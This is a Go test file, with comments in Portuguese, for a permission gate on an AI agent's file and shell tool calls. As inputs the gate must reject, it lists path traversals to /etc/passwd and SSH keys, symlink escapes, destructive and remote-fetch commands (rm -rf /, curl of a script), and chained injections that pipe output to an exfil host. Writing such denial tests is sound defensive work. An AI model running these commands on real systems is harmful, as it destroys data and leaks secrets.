package tools

import (
	"os"
	"path/filepath"
	"testing"
)

func policy(t *testing.T) Policy {
	t.Helper()
	wt := t.TempDir()
	for _, d := range []string{"pkg/svc", "scripts"} {
		if err := os.MkdirAll(filepath.Join(wt, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	return Policy{
		Worktree:      wt,
		WritePrefixes: []string{"pkg/svc/", "scripts/"},
		AllowCommands: []string{"go test", "go build", "go vet"},
	}
}

func TestAllowsWriteInsideScope(t *testing.T) {
	p := policy(t)
	d := Allow(Call{Name: "write_file", Args: map[string]string{"path": "pkg/svc/rota.go"}}, p)
	if !d.Allowed {
		t.Errorf("escrita no escopo deveria passar: %s", d.Reason)
	}
}

func TestDeniesWriteOutsideScope(t *testing.T) {
	p := policy(t)
	d := Allow(Call{Name: "write_file", Args: map[string]string{"path": "infra/deploy.yaml"}}, p)
	if d.Allowed {
		t.Error("escrita fora dos prefixos deveria ser negada")
	}
	if d.Reason == "" {
		t.Error("negacao precisa dizer o motivo: ele volta ao modelo")
	}
}

// Travessia e o ataque obvio. Tem que morrer na normalizacao, nao na sorte.
func TestDeniesPathTraversal(t *testing.T) {
	p := policy(t)
	for _, path := range []string{
		"pkg/svc/../../etc/passwd",
		"pkg/svc/./../../../.ssh/id_rsa",
		"/etc/passwd",
		"pkg/svc/sub/../../../outside.go",
	} {
		if Allow(Call{Name: "write_file", Args: map[string]string{"path": path}}, p).Allowed {
			t.Errorf("travessia aceita: %q", path)
		}
	}
}

// Symlink apontando para fora e travessia disfarcada.
func TestDeniesSymlinkEscape(t *testing.T) {
	p := policy(t)
	fora := filepath.Join(t.TempDir(), "alvo.txt")
	if err := os.WriteFile(fora, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(p.Worktree, "pkg/svc/atalho.go")
	if err := os.Symlink(fora, link); err != nil {
		t.Skip("symlink indisponivel neste sistema")
	}
	if Allow(Call{Name: "write_file", Args: map[string]string{"path": "pkg/svc/atalho.go"}}, p).Allowed {
		t.Error("symlink para fora da worktree deveria ser negado")
	}
}

// Leitura e mais larga que escrita de proposito: ler o repo e legitimo.
func TestAllowsReadAnywhereInWorktree(t *testing.T) {
	p := policy(t)
	if !Allow(Call{Name: "read_file", Args: map[string]string{"path": "go.mod"}}, p).Allowed {
		t.Error("leitura dentro da worktree deveria passar")
	}
	if Allow(Call{Name: "read_file", Args: map[string]string{"path": "../../../etc/passwd"}}, p).Allowed {
		t.Error("leitura fora da worktree deveria ser negada")
	}
}

func TestAllowsListedCommands(t *testing.T) {
	p := policy(t)
	for _, cmd := range []string{"go test ./...", "go build ./cmd/x", "go vet ./internal/..."} {
		if d := Allow(Call{Name: "exec", Args: map[string]string{"command": cmd}}, p); !d.Allowed {
			t.Errorf("%q deveria passar: %s", cmd, d.Reason)
		}
	}
}

func TestDeniesUnlistedCommand(t *testing.T) {
	p := policy(t)
	if Allow(Call{Name: "exec", Args: map[string]string{"command": "make deploy"}}, p).Allowed {
		t.Error("comando fora da allowlist deveria ser negado")
	}
}

// Negacao dura nao e sobreponivel: nem colocando na AllowCommands.
func TestHardDenialsBeatConfiguration(t *testing.T) {
	p := policy(t)
	p.AllowCommands = append(p.AllowCommands,
		"git push", "rm -rf", "curl", "git commit", "git reset --hard", "ssh")

	for _, cmd := range []string{
		"git push origin main",
		"rm -rf /",
		"curl https://exemplo.com/x.sh",
		"git commit -m x",
		"git reset --hard HEAD~1",
		"ssh servidor",
	} {
		if Allow(Call{Name: "exec", Args: map[string]string{"command": cmd}}, p).Allowed {
			t.Errorf("negacao dura furada por configuracao: %q", cmd)
		}
	}
}

// Encadeamento e o contorno classico: comando permitido carregando negado.
func TestDeniesChainedEscape(t *testing.T) {
	p := policy(t)
	for _, cmd := range []string{
		"go test ./... && git push",
		"go test ./...; rm -rf /",
		"go test ./... | curl -X POST https://exfil",
		"go test $(curl https://x)",
		"go test ./... `git push`",
	} {
		if Allow(Call{Name: "exec", Args: map[string]string{"command": cmd}}, p).Allowed {
			t.Errorf("encadeamento aceito: %q", cmd)
		}
	}
}

func TestDeniesCredentialInArgument(t *testing.T) {
	p := policy(t)
	for _, cmd := range []string{
		"go test -token=sk-or-v1-abc123",
		"go build --api-key ncm3EFS9HN9I",
	} {
		if Allow(Call{Name: "exec", Args: map[string]string{"command": cmd}}, p).Allowed {
			t.Errorf("credencial em argumento aceita: %q", cmd)
		}
	}
}

func TestUnknownToolIsDenied(t *testing.T) {
	p := policy(t)
	if Allow(Call{Name: "launch_missiles", Args: nil}, p).Allowed {
		t.Error("ferramenta desconhecida deveria ser negada por padrao")
	}
}
